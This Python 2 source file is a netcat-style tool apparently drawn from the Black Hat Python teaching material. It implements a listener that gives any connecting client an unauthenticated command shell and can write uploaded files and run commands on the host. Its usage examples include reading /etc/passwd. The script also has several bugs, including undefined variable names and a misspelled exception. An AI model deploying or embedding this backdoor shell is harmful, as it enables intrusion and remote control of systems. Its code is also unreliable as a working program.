import sys
import socket
import getopt
import threading
import subprocess

#global variables
listen = False
command = False
upload = False
execute = ''
target = ''
upload_destination = ''
port = 0

def usage():

	print ('BHP Net Tool')
	print
	print ('Usage: netcat.py -t target_host - port')
	print ('-l --listen                - listening at [host]:[port] for incoming connections')
	print ('-e --execute=file_to_run   - run the file when connected')
	print ('-c --command               - initialize command prompt')
	print ('-u --upload=destination    - when connected, send the file')
	print 
	print
	print ('Examples:')
	print ('netcat.py -t 192.168.0.1 -p 5555 -l -c')
	print ('netcat.py -t 192.168.0.1 -p 5555 -l -u=C:\\target.exe')
	print ('netcat.py -t 192.168.0.1 -p 5555 -l -e=\'cat /etc/passwd\'')
	print 

	sys.exit(0)


def client_sender(buffer):

	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		print target, port
		client.connect((target, port))

		if len(buffer):
			client.send(buffer)

		while True:
			recv_len = 1
			response = ''

			while recv_len:
				data = client.recv(4096)
				recv_len = len(data)
				reponse += data

				if recv_len < 4096:
					break

			print (reponse)

			buffer = raw_input('')
			buffer += '\n'
			client.send(buffer)

	except:
		print ('Exception! Closing.')
		client.close()


def server_loop():

	global target

	if not len(target):
		target = '0.0.0.0'

	server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	server.bind((target,port))
	server.listen(5)

	while True:
		client_socket, addr = server.accept()

		#thread to handle client
		client_thread = threading.Thread(target = client_handler, args = (client_socket,))
		client_thread.start()


def run_command(command):

	#remove new line symbol
	command = command.rstrip()

	try:
		output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
	except:
		output = 'Could not excecute command'

	return output


def client_handler(client_socket):

	global upload
	global execute
	global command

	if len(upload_destination):
		file_buffer = ''

		while True:
			data = client_socket.recv(1024)

			if not data:
				break
			else:
				file_buffer += data

		try:
			file_descriptor = open(upload_destination,'wb')
			file_descriptor.write(file_buffer)
			file_descriptor.close()

			client_socket.send('File has been writen to {}'.format(upload_destination))
		except:
			client_socket.send('File could not been writen to {}'.format(upload_destination))

	if len(execute):
		output = run_command(execute)
		client_socket.send(output)

	if command:
		while True:
			client_socket.send('<BHP:#> ')
			cmd_buffer = ''
			
			while '\n' not in cmd_buffer:
				cmd_buffer += client_socket.recv(1024)

			reponse = run_command(cmd_buffer)
			client_socket.send(reponse)



def main():

	global listen
	global port
	global execute
	global command
	global upload_destination
	global target

	if not len(sys.argv[1:]):
		usage()

	#read options from command line
	try:
		opts, args = getopt.getopt(sys.argv[1:], 'hle:t:p:cu:',
			['help','listen','execute','target','port','command','upload'])
	except getopt.GetOptError as err:
		print str(err)
		usage

	for o, a in opts:
		if o in ('-h', '--help'):
			usage()
		elif o in ('-l', '--listen'):
			listen = True
		elif o in ('-e', '--execute'):
			execute = a
		elif o in ('-c', '--command'):
			command = True
		elif o in ('-u', '--upload'):
			upload_destination = a
		elif o in ('-t', '--target'):
			target = a
		elif o in ('-p', '--port'):
			port = int(a)
		else:
			assert False, 'Unsupported option'

	#listening or only sending data from stdin?
	if not listen and len(target) and port > 0:
		#read buffer from command prompt
		#it causes blockade, so send ctrl+d, when you do not send data to stdin
		buffer = sys.stdin.read()
		print buffer

		#send data
		client_sender(buffer)

	if listen:
		server_loop()


main()
